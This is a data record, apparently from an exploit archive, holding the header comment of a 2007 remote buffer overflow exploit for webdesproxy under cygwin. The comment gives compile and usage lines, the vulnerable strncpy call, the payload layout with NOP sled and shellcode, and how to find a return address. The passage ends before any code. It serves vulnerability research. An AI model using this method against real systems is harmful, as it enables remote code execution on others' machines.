{
    "text": "ecve : CVE-2007-2668 ， title : webdesproxy 0.0.1 - GET Remote Buffer Overflow - Windows remote Exploit ， verified : Verified ， exploit_detail : / *  [ webdesproxy [ v0.0.1 ]  :  ( cygwin ) remote buffer overflow exploit. ]  *  ，  *  *  ，  * by : vade79/v9 v9 @ fakehalo.us ( fakehalo/realhalo )  *  ，  *  *  ，  * compile :  *  ，  * gcc xwdp-cygwin.c -o xwdp-cygwin *  ，  *  *  ，  * syntax :  *  ，  * ./xwdp-cygwin [ -r ] -h host -p port *  ，  *  *  ，  * webdesproxy homepage/url :  *  ，  *  *  ，  *  *  ，  *  *  ，  * I was curious on how cygwin-related ( stack ) buffer overflows *  ，  * behaved , so i browsed around for opensource cygwin-related *  ，  * projects and this fella popped up. not overly popular , but *  ，  * good for learning/exploration. one interesting note is it is *  ，  * easy to make universal cygwin exploits as cygwin1.dll is *  ，  * usually included with the program , making for possible static *  ，  * jmp/call addresses no matter the windows ( SP/Lang ) version. *  ，  *  ( excluding 64bit )  *  ，  *  *  ，  * Also , webdesproxy fork (  ) s all of its subprocesses , so it *  ，  * doesn't matter if it faults the first time. *  ，  *  *  ，  * bug :  *  ，  * webdesproxy.c : 111 : strncpy ( mb , myp , mypend-myp )  ;  *  ，  *  *  ，  * exploitation method :  *  ，  * \"GET ESP\" ]  [ NOPx32 ]  [ SC ] /\\n\\n\" *  ，  *  *  ，  * To find the address needed for the EIP overwrite , use *  ，  * findjmp.exe ( the defined/default address should work out of the *  ，  * box as the .dll is included with the program )  :  *  ，  * -------------------------------------------------------------- * ",
    "time": "2007-05-12"
}